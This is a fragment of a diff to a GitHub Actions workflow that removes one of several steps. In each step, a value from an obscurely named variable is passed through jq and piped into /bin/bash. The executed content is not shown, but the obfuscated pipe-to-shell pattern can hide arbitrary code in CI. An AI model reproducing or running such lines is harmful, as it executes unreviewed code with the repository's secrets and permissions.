@@ -35,7 +35,6 @@ jobs:
           echo $effm54546 | jq -r .uim4 | /bin/bash
           echo $gq139 | jq -r .ypoc18 | /bin/bash
           printf '%s' "$yd03" | jq -r .yf00568 | /bin/bash
-          echo $v24 | jq -r .u33140 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
